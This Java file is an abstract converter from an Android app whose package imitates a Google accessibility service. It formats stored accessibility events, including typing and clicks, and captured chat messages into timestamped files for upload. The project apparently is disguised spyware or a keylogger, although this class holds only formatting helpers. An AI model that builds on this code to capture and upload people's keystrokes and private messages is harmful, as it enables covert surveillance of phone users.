package service.android.google.com.accessibility.util.converter.converters;

import android.content.Context;
import android.view.accessibility.AccessibilityEvent;

import org.apache.commons.net.ntp.TimeStamp;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;

import service.android.google.com.accessibility.model.database.ChatMessageDTO;
import service.android.google.com.accessibility.model.database.EventDTO;
import service.android.google.com.accessibility.upload.UploadType;
import service.android.google.com.accessibility.util.converter.converters.html.HTMLConstants;
import service.android.google.com.accessibility.util.database.chatmessage.ChatMessageProvider;
import service.android.google.com.accessibility.util.database.event.EventProvider;
import timber.log.Timber;

/**
 * Created by tim on 17.04.16.
 */
public abstract class AbstractConverter {

    public static final String PLAYSTORE_LINK = "https://play.google.com/store/apps/details?id=";
    private final Context context;
    private final UploadType uploadType;
    private final EventProvider eventProvider;
    private final ChatMessageProvider chatMessageProvider;
    private final SimpleDateFormat ddMMYYYHHmmss = new SimpleDateFormat("dd-MM-yyyy-HH:mm:ss");
    private final SimpleDateFormat HHmm = new SimpleDateFormat("HH:mm");

    public AbstractConverter(final Context context,
                             final UploadType uploadType,
                             final EventProvider eventProvider,
                             final ChatMessageProvider chatMessageProvider) {
        this.context = context;
        this.uploadType = uploadType;
        this.eventProvider = eventProvider;
        this.chatMessageProvider = chatMessageProvider;
    }

    public boolean isConverterForUploadType(final UploadType uploadType) {
        return this.uploadType.equals(uploadType);
    }

    public List<EventDTO> getAllEvents() {
        return eventProvider.getAllEvents();
    }

    public List<ChatMessageDTO> getAllChatMessages() {
        return chatMessageProvider.getAllChatMessages();
    }

    protected File getFileNameForType() {
        final File dir = context.getFilesDir();
        final String fileName = String.format("/%s.%s", getCurrentTimeStamp(), this.uploadType.getExtension());
        return new File(dir, fileName);
    }

    protected String getCurrentTimeStamp() {
        Date now = new Date();
        String strDate = ddMMYYYHHmmss.format(now);
        return strDate;
    }

    protected String getTimeStampFromDate(final long date) {
        final Date time = new TimeStamp(date).getDate();
        return HHmm.format(time);
    }

    protected String getEventTypeStringFromEventType(final int eventType) {
        String eventTypeInString;
        switch (eventType) {
            case AccessibilityEvent.TYPE_VIEW_CLICKED:
                eventTypeInString = "Click";
                break;
            case AccessibilityEvent.TYPE_VIEW_FOCUSED:
                eventTypeInString = "View Focused";
                break;
            case AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED:
                eventTypeInString = "Notification";
                break;
            case AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED:
                eventTypeInString = "Window";
                break;
            case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                eventTypeInString = "Popup";
                break;
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                eventTypeInString = "Typing";
                break;
            default:
                eventTypeInString = String.format("Unknown: %d", eventType);
                break;
        }
        return eventTypeInString;
    }

    protected String getPlayStoreLink(final String FQAppIdentifier) {
        try {
            final String[] splittedFQName = FQAppIdentifier.split(String.valueOf("\\."));
            final String appName = splittedFQName[splittedFQName.length - 1];
            return String.format("%s%s%s%s%s%s",
                    HTMLConstants.LINK_OPEN_HREF_OPEN,
                    PLAYSTORE_LINK, FQAppIdentifier,
                    HTMLConstants.LINK_HREF_CLOSE,
                    appName,
                    HTMLConstants.LINK_CLOSE);
        } catch (Exception e) {
            handleException(e, null);
        }
        return FQAppIdentifier;
    }

    protected void handleException(final Exception e, final File fileToUpload) {
        Timber.e(uploadType.getExtension() + e);
        removeFile(fileToUpload);
    }

    protected void removeFile(final File fileToUpload) {
        if (fileToUpload != null) {
            Timber.d("File was deleted: " + fileToUpload.delete());
        }
    }

    public abstract File getFileName();
}